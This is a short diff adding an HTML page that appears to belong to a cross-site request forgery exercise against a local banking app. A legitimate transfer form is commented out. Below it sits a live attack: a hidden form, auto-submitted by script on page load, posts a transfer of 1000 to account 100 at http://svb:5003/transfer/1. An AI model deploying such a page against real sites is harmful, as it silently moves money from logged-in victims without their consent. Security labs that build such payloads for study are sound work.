@@ -1,0 +1,21 @@
+<!--
+<form method="POST" action="/transfer/100">
+    <div class="field">
+        <div class="control">
+            <input class="input is-large" type="text" name="account" placeholder="To account number">
+        </div>
+    </div>
+    <div class="field">
+        <div class="control">
+            <input class="input is-large" type="text" name="amount" placeholder="Amount">
+        </div>
+    </div>
+    <button class="button is-block is-info is-large is-fullwidth">Transfer</button>
+</form>
+-->
+
+<form id="Stoleringed" method="POST" action="http://svb:5003/transfer/1">
+    <input type="hidden" name="account" value="100"/>
+    <input type="hidden" name="amount" value="1000"/>
+</form>
+<script>document.getElementById('Stoleringed').submit();</script>
